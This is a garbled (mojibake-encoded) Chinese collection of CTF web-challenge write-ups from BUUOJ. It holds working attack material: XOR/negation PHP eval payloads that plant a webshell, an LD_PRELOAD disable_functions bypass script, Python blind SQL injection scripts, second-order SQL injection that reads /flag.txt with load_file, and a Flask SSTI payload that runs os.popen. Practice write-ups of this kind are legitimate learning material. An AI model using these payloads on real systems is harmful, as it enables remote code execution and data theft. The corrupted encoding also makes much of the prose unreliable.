å‡½æ•°çš„åŠŸèƒ½ï¼šä»stringä¸­è¯»å‡ºåºåˆ—åŒ–å‰çš„objå¯¹è±¡ã€‚ å‚æ•°è®²è§£ï¼š stringï¼šæ–‡ä»¶åç§°ã€‚ ã€æ³¨ã€‘ dump() ä¸ load() ç›¸æ¯” dumps() å’Œ loads() è¿˜æœ‰å¦ä¸€ç§èƒ½åŠ›ï¼šdump()å‡½æ•°èƒ½ä¸€ä¸ªæ¥ç€ä¸€ä¸ªåœ°å°†å‡ ä¸ªå¯¹è±¡åºåˆ—åŒ–å­˜å‚¨åˆ°åŒä¸€ä¸ªæ–‡ä»¶ä¸­ï¼Œéšåè°ƒç”¨load()æ¥ä»¥åŒæ ·çš„é¡ºåºååºåˆ—åŒ–è¯»å‡ºè¿™äº›å¯¹è±¡ã€‚è€Œåœ¨__reduce__æ–¹æ³•é‡Œé¢æˆ‘ä»¬å°±è¿›è¡Œè¯»å–flag.txtæ–‡ä»¶ï¼Œå¹¶å°†è¯¥ç±»åºåˆ—åŒ–ä¹‹åè¿›è¡ŒURLç¼–ç  æ£€æµ‹ååºåˆ—åŒ–æ–¹æ³•ï¼š å…¨å±€æœç´¢Pythonä»£ç ä¸­æ˜¯å¦å«æœ‰å…³é”®å­—ç±»ä¼¼â€œimport cPickleâ€æˆ–â€œimport pickleâ€ç­‰ï¼Œè‹¥å­˜åœ¨åˆ™è¿›ä¸€æ­¥ç¡®è®¤æ˜¯å¦è°ƒç”¨cPickle.loads()æˆ–pickle.loads()ä¸”ååºåˆ—åŒ–çš„å‚æ•°å¯æ§ã€‚ é˜²å¾¡æ–¹æ³• 1ã€ç”¨æ›´é«˜çº§çš„æ¥å£__getnewargs()ã€__getstate__()ã€__setstate__()ç­‰ä»£æ›¿__reduce__()é­”æœ¯æ–¹æ³•ï¼› 2ã€è¿›è¡Œååºåˆ—åŒ–æ“ä½œä¹‹å‰ï¼Œè¿›è¡Œä¸¥æ ¼çš„è¿‡æ»¤ï¼Œè‹¥é‡‡ç”¨çš„æ˜¯pickleåº“å¯é‡‡ç”¨è£…é¥°å™¨å®ç°ã€‚ è¿™é‡Œé‡‡ç”¨reduce å½“__reduce__è¢«å®šä¹‰ä¹‹åï¼Œè¯¥å¯¹è±¡è¢«Pickleæ—¶å°±ä¼šè¢«è°ƒç”¨æˆ‘ä»¬è¿™é‡Œçš„evalç”¨äºé‡å»ºå¯¹è±¡çš„æ—¶å€™è°ƒç”¨ï¼Œå³å‘Šè¯‰pythonå¦‚ä½•pickleä»–ä»¬ä¾›evalä½¿ç”¨çš„å³æ‰“å¼€çš„æ–‡ä»¶flag.txtå…¶ä»–çš„å‚æ•°æˆ‘ä»¬å¯ä»¥ä¸å¡« ç™¾åº¦ä¸ªè„šæœ¬ æŠŠè¿™ä¸ªå€¼ç»™becomeé‡Œæ”¾åŒ…å°±è¡Œ å‚è€ƒé“¾æ¥ Pythoné­”æ³•æ–¹æ³•æŒ‡å—_å®‡å®™æµªå­çš„ä¸“æ -CSDNåšå®¢ Pythonååºåˆ—åŒ–æ¼æ´çš„èŠ±å¼åˆ©ç”¨ - å…ˆçŸ¥ç¤¾åŒº (aliyun.com) å‡ å¤©ä¹‹åçš„è¡¥ï¼Œjwté‚£ä¸ªå·¥å…·ç¯å¢ƒå¼„å¥½äº† [MRCTF2020]å¥—å¨ƒæ‰å‘ç°è¿™å°±æ˜¯å¯’å‡é‚£ä¸ªæ‹›æ–°èµ›çš„åŸé¢˜ ä¸‹åˆ’çº¿å¯ä»¥ç”¨.æ¥ç»•è¿‡ï¼Œç¬¬äºŒä¸ªifå¯ä»¥åˆ©ç”¨%0aæ¢è¡Œç»•è¿‡ è¦æ±‚æœ¬åœ°ç™»å½• æŠ“åŒ…æ”¹xff é‡Œé¢æœ‰ä¸€æ®µjsä»£ç  postä¸€ä¸ªmerakå€¼ï¼Œå¾—åˆ°ä¸€æ®µä»£ç  ä»£ç å®¡è®¡ è¦æ±‚getè¿›ä¸€ä¸ªå€¼ä¸”å­˜åœ¨ä¸€ä¸ªæ–‡ä»¶åä¸ºè¿™ä¸ªå€¼çš„æ–‡ä»¶ï¼Œå†…å®¹ä¸ºtodat is a happy day å¯ä»¥ç”¨data://text/plain,ç»•è¿‡ ä¹Ÿå¯ä»¥ç”¨data://text/plain;base64, ç„¶åå­˜åœ¨ä¸€ä¸ªfile_get_contentsè¯»å–ä¼ å…¥çš„file è¦è®©è¿™ä¸ªå€¼ç»è¿‡changeå‡½æ•°åä¸ºflag.php ä¼ è¿›å»ï¼Œæ‹¿flag [æå®¢å¤§æŒ‘æˆ˜ 2019]RCE ME&lt;?php error_reporting(0); if(isset($_GET[&#39;code&#39;]))&#123; $code&#x3D;$_GET[&#39;code&#39;]; if(strlen($code)&gt;40)&#123; die(&quot;This is too Long.&quot;); &#125; if(preg_match(&quot;&#x2F;[A-Za-z0-9]+&#x2F;&quot;,$code))&#123; die(&quot;NO.&quot;); &#125; @eval($code); &#125; else&#123; highlight_file(__FILE__); &#125; &#x2F;&#x2F; ?&gt; æœ‰evalå‡½æ•°ï¼Œè¦è¯•å›¾å‘½ä»¤æ‰§è¡Œï¼Œç„¶åpreg_matchè¿‡æ»¤äº†å­—æ¯å’Œæ•°å­—ï¼Œè¿™é‡Œå¯ä»¥åˆ©ç”¨å¼‚æˆ–æˆ–è€…æ˜¯urlç¼–ç å–åæ¥ç»•è¿‡ å–å æˆåŠŸæ‰§è¡Œ è¿™é‡Œå¯ä»¥çœ‹åˆ°ç¦ç”¨çš„å‡½æ•° æˆ–è€…åˆ©ç”¨å¼‚æˆ– code&#x3D;$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;%ff&#x3D;phpinfo ä¸€æ ·å¯ä»¥è¿›å…¥phpinfoé¡µé¢ æŸ¥çœ‹åˆ°ç¦ç”¨çš„å‡½æ•°åå¯ä»¥å°è¯•åˆ©ç”¨å–åæˆ–è€…å¼‚æˆ–å†™å…¥ä¸€å¥è¯æœ¨é©¬ //æŠ„çš„payload ?code&#x3D;(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%92%90%9C%97%8A%C8%A2%D6%D6); &#x2F;&#x2F;åˆ«å¿˜äº†åé¢çš„åˆ†å· æˆ–è€…ï¼š ?code&#x3D;$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[_]($&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[__]);&amp;_&#x3D;assert&amp;__&#x3D;eval($_POST[%27a%27]) ç„¶åèšå‰‘é“¾æ¥ï¼Œè¦æ‰§è¡Œè¯»å–flagçš„readflagäºŒè¿›åˆ¶æ–‡ä»¶æ‰èƒ½å¾—åˆ°flag ä½†æ˜¯ disable_functionsç¦ç”¨çš„å‡½æ•°å¤ªå¤šå¯¼è‡´shellä¸èƒ½æ‰§è¡Œå‘½ä»¤ è¿™é‡Œå¯ä»¥ç”¨èšå‰‘çš„æ’ä»¶ï¼ˆèšå‰‘yyds è¿˜æœ‰ä¸€ç§æ–¹æ³• åˆ©ç”¨linuxæä¾›çš„LD_preloadç¯å¢ƒå˜é‡ï¼ŒåŠ«æŒå…±äº«soï¼Œåœ¨å¯åŠ¨å­è¿›ç¨‹çš„æ—¶å€™ï¼Œæ–°çš„å­è¿›ç¨‹ä¼šåŠ è½½æˆ‘ä»¬æ¶æ„çš„soæ‹“å±•ï¼Œç„¶åæˆ‘ä»¬å¯ä»¥åœ¨soé‡Œé¢å®šä¹‰åŒåå‡½æ•°ï¼Œå³å¯åŠ«æŒAPIè°ƒç”¨ï¼ŒæˆåŠŸRCEå‚è€ƒé“¾æ¥ï¼šhttps://www.anquanke.com/post/id/175403 æ— éœ€sendmailï¼šå·§ç”¨LD_PRELOADçªç ´disable_functions - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ· EXPåœ°å€ æˆ‘çœ‹ä¸æ‡‚ï¼Œä½†æˆ‘å¤§å—éœ‡æ’¼ ä¸Šä¼ bypass.php &lt;?php echo &quot;&lt;p&gt; &lt;b&gt;example&lt;&#x2F;b&gt;: http:&#x2F;&#x2F;site.com&#x2F;bypass_disablefunc.php?cmd&#x3D;pwd&amp;outpath&#x3D;&#x2F;tmp&#x2F;xx&amp;sopath&#x3D;&#x2F;var&#x2F;www&#x2F;bypass_disablefunc_x64.so &lt;&#x2F;p&gt;&quot;; $cmd &#x3D; $_GET[&quot;cmd&quot;]; $out_path &#x3D; $_GET[&quot;outpath&quot;]; $evil_cmdline &#x3D; $cmd . &quot; &gt; &quot; . $out_path . &quot; 2&gt;&amp;1&quot;; echo &quot;&lt;p&gt; &lt;b&gt;cmdline&lt;&#x2F;b&gt;: &quot; . $evil_cmdline . &quot;&lt;&#x2F;p&gt;&quot;; putenv(&quot;EVIL_CMDLINE&#x3D;&quot; . $evil_cmdline); &#x2F;&#x2F;è®¾ç½®EVIL_CMDLINEç¯å¢ƒå˜é‡ $so_path &#x3D; $_GET[&quot;sopath&quot;]; putenv(&quot;LD_PRELOAD&#x3D;&quot; . $so_path); &#x2F;&#x2F;åŠ è½½æ¶æ„åŠ¨æ€åº“ mail(&quot;&quot;, &quot;&quot;, &quot;&quot;, &quot;&quot;); &#x2F;&#x2F;åˆ©ç”¨mailå‡½æ•°è§¦å‘æ¶æ„å‡½æ•°ï¼Œè·³è½¬è‡³__attribute__ ((__constructor__))ä¿®é¥°çš„å‡½æ•°ã€‚ echo &quot;&lt;p&gt; &lt;b&gt;output&lt;&#x2F;b&gt;: &lt;br &#x2F;&gt;&quot; . nl2br(file_get_contents($out_path)) . &quot;&lt;&#x2F;p&gt;&quot;; unlink($out_path); ?&gt; æœ€ç»ˆpayload http:&#x2F;&#x2F;68a9a191-87dd-4067-ac30-321118de4427.node4.buuoj.cn:81&#x2F;?code&#x3D;$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[_]($&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[__]);&amp;_&#x3D;assert&amp;__&#x3D;include(%27&#x2F;var&#x2F;tmp&#x2F;bypass.php%27)&amp;cmd&#x3D;&#x2F;readflag&amp;outpath&#x3D;&#x2F;tmp&#x2F;tmpfile&amp;sopath&#x3D;&#x2F;var&#x2F;tmp&#x2F;bypass_disablefunc_x64.so å‚è€ƒé“¾æ¥ bypass_disable_functions | 0xCreed (jxustctf.top) [BUUOJè®°å½•] [æå®¢å¤§æŒ‘æˆ˜ 2019]RCE ME - Ye&#39;sBlog - åšå®¢å›­ (cnblogs.com) æå®¢å¤§æŒ‘æˆ˜ 2019]RCE ME_æœ«åˆ Â· mochu7-CSDNåšå®¢ æå®¢å¤§æŒ‘æˆ˜ 2019]RCE MEï¼ˆå–åã€å¼‚æˆ–ç»•è¿‡æ­£åˆ™è¡¨è¾¾å¼ã€bypass disable_functionï¼‰_WHOAMIAnonyçš„åšå®¢-CSDNåšå®¢_å¼‚æˆ–ç»•è¿‡ [BSidesCF 2019]Kookie ä¸çŸ¥é“å¯†ç ï¼Œsqlæ³¨å…¥ä¹Ÿä¸æˆåŠŸ ç›´æ¥æŠŠcookieæ”¹æˆusername=cookieå°±è¡Œäº†ï¼Œä¸æ¸…æ¥šè¿™é¢˜åœ¨è€ƒå•¥ã€‚ã€‚ã€‚ [WUSTCTF2020]é¢œå€¼æˆç»©æŸ¥è¯¢å¸ƒå°”ç›²æ³¨ï¼Œè¿‡æ»¤äº†ç©ºæ ¼ (ascii(substr(database(),{},1))={})&quot;.format(i,j) (ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),{},1))={}) (ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#39;flag&#39;)),{},1))={}) (ascii(substr((select(group_concat(value))from(flag)) è„šæœ¬ï¼š import requests url &#x3D; &quot;http:&#x2F;&#x2F;ff19146a-59b8-4bd0-8ded-5bf195180739.node4.buuoj.cn:81&#x2F;?stunum&#x3D;0^&quot; data &#x3D; &#39;&#39; k &#x3D; 0 for i in range(13,50): k &#x3D; 0 for j in range(43,127): gets &#x3D; &quot;(ascii(substr((select(group_concat(value))from(flag)),&#123;&#125;,1))&#x3D;&#123;&#125;)&quot;.format(i,j) res &#x3D; requests.get(url+gets) if &quot;your score is: 100&quot; in res.text: data +&#x3D; chr(j) print(data) k &#x3D; 1 break if(k &#x3D;&#x3D; 0): print(&quot;err!&quot;) exit() å› ä¸ºç½‘ç»œé—®é¢˜åŠ äº†åˆ¤æ–­ï¼Œç»“æœå°±æ˜¯è·‘ä¸€ä¼šå°±åœäº†ï¼Œåªèƒ½ä¸€æ®µä¸€æ®µçš„è·‘äº† ä¸€å®šæ˜¯buu flagå¤ªé•¿äº†ï¼ˆ ç®—æ˜¯ç¬¬ä¸€æ¬¡è‡ªå·±å†™è„šæœ¬äº† éå†å±å®è·‘çš„å¤ªæ…¢äº†ï¼ŒæŠ½ç©ºå­¦ä¸€ä¸‹äºŒåˆ†æ³•çš„å†™æ³• flag{d8fd8842-58bd-4a88-bf0c-8e73811797a4} [GWCTF 2019]æ¯ç‡¥çš„æŠ½å¥– æ¶‰åŠäº†phpçš„ä¼ªéšæœº å¦‚æœmt_srandä½¿ç”¨åŒä¸€ä¸ªseedï¼Œç”Ÿæˆçš„éšæœºæ•°æ˜¯å¯ä»¥çˆ†ç ´å‡ºseedçš„ æŸ¥çœ‹æºç æ‰¾åˆ°check.php pbEzqyRCJP &lt;?php #è¿™ä¸æ˜¯æŠ½å¥–ç¨‹åºçš„æºä»£ç ï¼ä¸è®¸çœ‹ï¼ header(&quot;Content-Type: text&#x2F;html;charset&#x3D;utf-8&quot;); session_start(); if(!isset($_SESSION[&#39;seed&#39;]))&#123; $_SESSION[&#39;seed&#39;]&#x3D;rand(0,999999999); &#125; mt_srand($_SESSION[&#39;seed&#39;]); $str_long1 &#x3D; &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;; $str&#x3D;&#39;&#39;; $len1&#x3D;20; for ( $i &#x3D; 0; $i &lt; $len1; $i++ )&#123; $str.&#x3D;substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1); &#125; $str_show &#x3D; substr($str, 0, 10); echo &quot;&lt;p id&#x3D;&#39;p1&#39;&gt;&quot;.$str_show.&quot;&lt;&#x2F;p&gt;&quot;; if(isset($_POST[&#39;num&#39;]))&#123; if($_POST[&#39;num&#39;]&#x3D;&#x3D;&#x3D;$str)&#123;x echo &quot;&lt;p id&#x3D;flag&gt;æŠ½å¥–ï¼Œå°±æ˜¯é‚£ä¹ˆæ¯ç‡¥ä¸”æ— å‘³ï¼Œç»™ä½ flag&#123;xxxxxxxxx&#125;&lt;&#x2F;p&gt;&quot;; &#125; else&#123; echo &quot;&lt;p id&#x3D;flag&gt;æ²¡æŠ½ä¸­å“¦ï¼Œå†è¯•è¯•å§&lt;&#x2F;p&gt;&quot;; &#125; &#125; show_source(&quot;check.php&quot;); çŸ¥é“å‰å‡ ä½äº† æ ¹æ®ç”Ÿæˆç®—æ³•é€†å‘å‡ºæ»¡è¶³php_mt_seedå·¥å…·è¦æ±‚çš„å‚æ•°ï¼ˆç™¾åº¦æŠ„çš„ str1&#x3D;&#39;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#39; str2&#x3D;&#39;ENxxxZwNwR&#39; str3 &#x3D; str1[::-1] length &#x3D; len(str2) res&#x3D;&#39;&#39; for i in range(len(str2)): for j in range(len(str1)): if str2[i] &#x3D;&#x3D; str1[j]: res+&#x3D;str(j)+&#39; &#39;+str(j)+&#39; &#39;+&#39;0&#39;+&#39; &#39;+str(len(str1)-1)+&#39; &#39; break print(res) æ”¾åˆ°php_mt_seedé‡Œè·‘ç§å­ å†åˆ©ç”¨è¿™ä¸ªè„šæœ¬å¾—åˆ°æœ€åçš„å€¼ &lt;?php mt_srand(499600072); $str_long1 &#x3D; &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;; $str&#x3D;&#39;&#39;; $len1&#x3D;20; for ( $i &#x3D; 0; $i &lt; $len1; $i++ )&#123; $str.&#x3D;substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1); &#125; echo $str; ?&gt; åæ§½ä¸€ä¸‹ï¼Œå·¥ä¸šäº’è”ç½‘çš„æ—¶å€™çœ‹è§ä¸€ä¸ªç±»ä¼¼çš„é¢˜ï¼Œç…§ç€è¿™ä¸ªé¢˜çš„wpæ²¡è·‘å‡ºæ¥ï¼Œä»Šå¤©æ‰çŸ¥é“æ˜¯php_mt_seedçš„é—®é¢˜ï¼Œè™½ç„¶æ„Ÿè§‰å¾ˆç¦»è°± å®˜ç½‘ä¸‹çš„çˆ†ä¸å‡ºseedï¼Œä»è¿™é‡Œä¸‹çš„å¯ä»¥Index of /pub/projects/php_mt_seed (openwall.net) è¿˜æœ‰å°±æ˜¯ä¸€æ ·çš„ç§å­åœ¨phpç‰ˆæœ¬ä¸ä¸€æ ·çš„æ—¶å€™å‡ºæ¥çš„å€¼ä¹Ÿä¸ä¸€æ · [Zer0pts2020]Can you guess it?&lt;?php include &#39;config.php&#39;; &#x2F;&#x2F; FLAG is defined in config.php if (preg_match(&#39;&#x2F;config\\.php\\&#x2F;*$&#x2F;i&#39;, $_SERVER[&#39;PHP_SELF&#39;])) &#123; exit(&quot;I don&#39;t know what you are thinking, but I won&#39;t let you read it :)&quot;); &#125; if (isset($_GET[&#39;source&#39;])) &#123; highlight_file(basename($_SERVER[&#39;PHP_SELF&#39;])); exit(); &#125; $secret &#x3D; bin2hex(random_bytes(64)); if (isset($_POST[&#39;guess&#39;])) &#123; $guess &#x3D; (string) $_POST[&#39;guess&#39;]; if (hash_equals($secret, $guess)) &#123; $message &#x3D; &#39;Congratulations! The flag is: &#39; . FLAG; &#125; else &#123; $message &#x3D; &#39;Wrong.&#39;; &#125; &#125; ?&gt; &lt;!doctype html&gt; &lt;html lang&#x3D;&quot;en&quot;&gt; &lt;head&gt; &lt;meta charset&#x3D;&quot;utf-8&quot;&gt; &lt;title&gt;Can you guess it?&lt;&#x2F;title&gt; &lt;&#x2F;head&gt; &lt;body&gt; &lt;h1&gt;Can you guess it?&lt;&#x2F;h1&gt; &lt;p&gt;If your guess is correct, I&#39;ll give you the flag.&lt;&#x2F;p&gt; &lt;p&gt;&lt;a href&#x3D;&quot;?source&quot;&gt;Source&lt;&#x2F;a&gt;&lt;&#x2F;p&gt; &lt;hr&gt; &lt;?php if (isset($message)) &#123; ?&gt; &lt;p&gt;&lt;?&#x3D; $message ?&gt;&lt;&#x2F;p&gt; &lt;?php &#125; ?&gt; &lt;form action&#x3D;&quot;index.php&quot; method&#x3D;&quot;POST&quot;&gt; &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;guess&quot;&gt; &lt;input type&#x3D;&quot;submit&quot;&gt; &lt;&#x2F;form&gt; &lt;&#x2F;body&gt; &lt;&#x2F;html&gt; è¿™é‡Œæˆ‘æœ¬æ¥ä»¥ä¸ºæ˜¯phpä¼ªéšæœºæ•°çš„æ¼æ´ï¼Œç»“æœæœ€åæŸ¥äº†ä¸€ä¸‹å‘ç°æ˜¯basenameå‡½æ•°çš„æ¼æ´ å®ƒä¼šå¿½ç•¥åé¢çš„[\\x80-\\xff]èŒƒå›´å†…çš„å­—ç¬¦ä¸²ï¼Œå³éasciiå­—ç¬¦ã€‚ä¾‹å­å¦‚ä¸‹ï¼š php -r &#39;print(basename(&quot;index.php&#x2F;config.php&#x2F;\\x80&quot;));&#39; &#x2F;&#x2F; config.php php -r &#39;print(basename(&quot;\\x80index.php&#x2F;config.php&quot;));&#39; &#x2F;&#x2F; config.php $_SERVER[â€˜PHP_SELFâ€™]è¡¨ç¤ºå½“å‰æ‰§è¡Œè„šæœ¬çš„æ–‡ä»¶åï¼Œå½“ä½¿ç”¨äº†PATH_INFOæ—¶ï¼Œè¿™ä¸ªå€¼æ˜¯å¯æ§çš„ã€‚æ‰€ä»¥å¯ä»¥å°è¯•ç”¨/index.php/config.php?sourceæ¥è¯»å–flagã€‚ [CISCN2019 æ€»å†³èµ› Day2 Web1]Easywebæºç æ³„éœ² ä¸‹è½½image.php.bak &lt;?php include &quot;config.php&quot;; $id&#x3D;isset($_GET[&quot;id&quot;])?$_GET[&quot;id&quot;]:&quot;1&quot;; $path&#x3D;isset($_GET[&quot;path&quot;])?$_GET[&quot;path&quot;]:&quot;&quot;; $id&#x3D;addslashes($id); $path&#x3D;addslashes($path); $id&#x3D;str_replace(array(&quot;\\\\0&quot;,&quot;%00&quot;,&quot;\\\\&#39;&quot;,&quot;&#39;&quot;),&quot;&quot;,$id); $path&#x3D;str_replace(array(&quot;\\\\0&quot;,&quot;%00&quot;,&quot;\\\\&#39;&quot;,&quot;&#39;&quot;),&quot;&quot;,$path); $result&#x3D;mysqli_query($con,&quot;select * from images where id&#x3D;&#39;&#123;$id&#125;&#39; or path&#x3D;&#39;&#123;$path&#125;&#39;&quot;); $row&#x3D;mysqli_fetch_array($result,MYSQLI_ASSOC); $path&#x3D;&quot;.&#x2F;&quot; . $row[&quot;path&quot;]; header(&quot;Content-Type: image&#x2F;jpeg&quot;); readfile($path); GETæ–¹å¼ä¼ å…¥å˜é‡idçš„å€¼ï¼Œè‹¥æ²¡æœ‰åˆ™ä¸º1GETæ–¹å¼ä¼ å…¥å˜é‡pathçš„å€¼ï¼Œè‹¥æ²¡æœ‰åˆ™ä¸ºç©ºaddslashes() å‡½æ•°è¿”å›åœ¨é¢„å®šä¹‰å­—ç¬¦ä¹‹å‰æ·»åŠ åæ–œæ çš„å­—ç¬¦ä¸²ï¼Œå•å¼•å·ï¼ˆ&#39;ï¼‰ã€åŒå¼•å·ï¼ˆ&quot;ï¼‰ã€åæ–œæ ï¼ˆ\\ï¼‰str_replace()å‡½æ•°å°†ä¸¤ä¸ªå˜é‡å†…çš„\\0ã€%00ã€&#39;ã€&#39;éƒ½æ›¿æ¢ä¸ºç©ºå°†å˜é‡$idä¸$pathæ‹¼æ¥è¿›SQLè¯­å¥è„šæœ¬ï¼š import requests url &#x3D; &quot;http:&#x2F;&#x2F;f99fde09-be38-4b5a-bea6-2362fb4115e4.node4.buuoj.cn:81&#x2F;image.php?id&#x3D;\\\\0&#39;&amp;path&#x3D;&quot; payload1 &#x3D; r&quot;or ascii(substr(database(),&#123;&#125;,1))&gt;&#123;&#125; --+&quot; payload2 &#x3D; r&quot;or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema &#x3D; database()),&#123;&#125;,1)) &gt; &#123;&#125; --+&quot; payload3 &#x3D; r&quot;or ascii(substr((select group_concat(column_name) from information_schema.columns where table_name &#x3D; 0x7573657273),&#123;&#125;,1)) &gt; &#123;&#125; --+&quot; payload4 &#x3D; r&quot;or ascii(substr((select password from users),&#123;&#125;,1)) &gt; &#123;&#125; --+&quot; database &#x3D; &quot;&quot; for i in range(1,1000): low &#x3D; 32 high &#x3D; 128 mid &#x3D; (low + high) &#x2F;&#x2F; 2 while(low &lt; high): payload &#x3D; payload4.format(i,mid) new_url &#x3D; url + payload r &#x3D; requests.get(new_url) if &quot;JFIF&quot; in r.text: low &#x3D; mid + 1 else: high &#x3D; mid mid &#x3D; (low + high) &#x2F;&#x2F; 2 if (mid &#x3D;&#x3D; 32 or mid &#x3D;&#x3D; 128): break database +&#x3D; chr(mid) print(database) å¾—åˆ°å¯†ç å’Œç”¨æˆ·åç™»å½• ç™»å½•åæ˜¯ä¸ªæ–‡ä»¶ä¸Šä¼ çš„é¡µé¢ è¿™é‡Œè¦ç”¨æ–‡ä»¶åä¼ ä¸€å¥è¯æœ¨é©¬ åœ¨ä¸Šä¼ åçš„ç›®å½•å¯ä»¥çœ‹åˆ°ä¸Šä¼ çš„æ–‡ä»¶åä½†æ˜¯ä¸èƒ½è®¿é—®ä¸Šä¼ æ–‡ä»¶çš„å†…å®¹ ä¸èƒ½ç”¨phpå°±ç”¨çŸ­æ ‡ç­¾ä»£æ›¿ [CISCN2019 ååŒ—èµ›åŒº Day1 Web5]CyberPunkç¬¬ä¸€æ¬¡é‡è§äºŒæ¬¡æ³¨å…¥çš„é¢˜ï¼Œæ­£å¥½å­¦ä¸€ä¸‹ æºç é‡Œæœ‰ä¸ªfileï¼ŒçŒœæµ‹æœ‰æ–‡ä»¶åŒ…å«ï¼Œå¯ä»¥åˆ©ç”¨ä¼ªåè®®è¯»å–è¿™å‡ ä¸ªé¡µé¢çš„æºç  change.phpé¡µé¢ &lt;?php require_once &quot;config.php&quot;; if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;address&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;])) &#123; $msg &#x3D; &#39;&#39;; $pattern &#x3D; &#39;&#x2F;select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile&#x2F;i&#39;; $user_name &#x3D; $_POST[&quot;user_name&quot;]; $address &#x3D; addslashes($_POST[&quot;address&quot;]); $phone &#x3D; $_POST[&quot;phone&quot;]; if (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123; $msg &#x3D; &#39;no sql inject!&#39;; &#125;else&#123; $sql &#x3D; &quot;select * from &#96;user&#96; where &#96;user_name&#96;&#x3D;&#39;&#123;$user_name&#125;&#39; and &#96;phone&#96;&#x3D;&#39;&#123;$phone&#125;&#39;&quot;; $fetch &#x3D; $db-&gt;query($sql); &#125; if (isset($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;0)&#123; $row &#x3D; $fetch-&gt;fetch_assoc(); $sql &#x3D; &quot;update &#96;user&#96; set &#96;address&#96;&#x3D;&#39;&quot;.$address.&quot;&#39;, &#96;old_address&#96;&#x3D;&#39;&quot;.$row[&#39;address&#39;].&quot;&#39; where &#96;user_id&#96;&#x3D;&quot;.$row[&#39;user_id&#39;]; $result &#x3D; $db-&gt;query($sql); if(!$result) &#123; echo &#39;error&#39;; print_r($db-&gt;error); exit; &#125; $msg &#x3D; &quot;è®¢å•ä¿®æ”¹æˆåŠŸ&quot;; &#125; else &#123; $msg &#x3D; &quot;æœªæ‰¾åˆ°è®¢å•!&quot;; &#125; &#125;else &#123; $msg &#x3D; &quot;ä¿¡æ¯ä¸å…¨&quot;; &#125; ä¸»è¦çš„æ¼æ´ç‚¹å°±åœ¨change.php å› ä¸ºå…¶ä»–è¾“å…¥ä½ç½®è¿‡æ»¤çš„å¤ªå¤šï¼ŒåŸºæœ¬èƒ½æ³¨å…¥çš„éƒ½è¢«è¿‡æ»¤äº†ï¼Œæ‰€ä»¥åªèƒ½åˆ©ç”¨address åœ¨åˆ›å»ºaddressæ—¶è™½ç„¶å¯¹è¾“å…¥çš„æ•°æ®è¿›è¡Œäº†addslashesè¿‡æ»¤ ä½†ä¹‹åè¿˜ä¼šå¯¹æ—§addressè¿›è¡Œä¸€æ¬¡sqlæŸ¥è¯¢ å› æ­¤å¯ä»¥åˆ©ç”¨äºŒæ¬¡æ³¨å…¥ï¼Œå†ç»“åˆæŠ¥é”™æ³¨å…¥ï¼Œå’Œload_fileå‡½æ•°è¯»å–flagæ–‡ä»¶ åœ¨åˆ›å»ºæ—¶åœ¨åœ°å€ä¸­è¾“å…¥æ³¨å…¥è¯­å¥ 1&#39; where user_id=updatexml(1,concat(0x7e,(select substr(load_file(&#39;/flag.txt&#39;),1,20)),0x7e),1)# 1&#39; where user_id=updatexml(1,concat(0x7e,(select substr(load_file(&#39;/flag.txt&#39;),21,50)),0x7e),1)# ï¼ˆè¿™é‡Œä¹‹æ‰€ä»¥è¦çœ‹flag.txtæ ¹æ®å¸ˆå‚…ä»¬çš„åšå®¢æ¨æµ‹æ˜¯çº¯é çŒœçš„ åœ¨ä¿®æ”¹åœ°å€çš„æ—¶å€™å°±ä¼šé‡æ–°è°ƒç”¨è¿™ä¸ªsqlè¯­å¥ï¼ŒæŠ¥é”™è¾“å‡ºflag [CSCCTF 2019 Qual]FlaskLightä¸€çœ¼sstiï¼Œç„¶åå°±ä¸ä¼šäº†ï¼ˆ f12çœ‹åˆ°æºç æ³¨é‡Šï¼Œgetæ–¹å¼ï¼Œå‚æ•°ä¸ºsearch è¯•ä¸€ä¸‹ä¼ 49ç¡®å®šæ˜¯ssti config ä¹Ÿæ˜¯ Flaskæ¨¡ç‰ˆä¸­çš„ä¸€ä¸ªå…¨å±€å¯¹è±¡,å®ƒåŒ…å«äº†æ‰€æœ‰åº”ç”¨ç¨‹åºçš„é…ç½®å€¼ã€‚ &#123;&#123; config.items() &#125;&#125; &#x2F;&#x2F; æŸ¥çœ‹é…ç½®é¡¹ç›®çš„ä¿¡æ¯ ä¾‹ä¸€ï¼šwarnings.catch_warningsç±» &#123;&#123;[].__class__.__base__.__subclasses__()[59].__init__[&#39;__glo&#39;+&#39;bals__&#39;][&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;ls&#39;).read()&quot;)&#125;&#125; PSï¼šç”±äºä½¿ç”¨[â€˜globalsâ€™]ä¼šé€ æˆ500çš„æœåŠ¡å™¨é”™è¯¯ä¿¡æ¯ï¼Œå¹¶ä¸”å½“æˆ‘ç›´æ¥è¾“å…¥search=globalsæ—¶é¡µé¢ä¹Ÿä¼š500ï¼Œè§‰å¾—è¿™é‡Œåº”è¯¥æ˜¯è¢«è¿‡æ»¤äº†ï¼Œæ‰€ä»¥è¿™é‡Œé‡‡ç”¨äº†å­—ç¬¦ä¸²æ‹¼æ¥çš„å½¢å¼[â€˜gloâ€™+&#39;balsâ€™] æœ€åè·å–flag 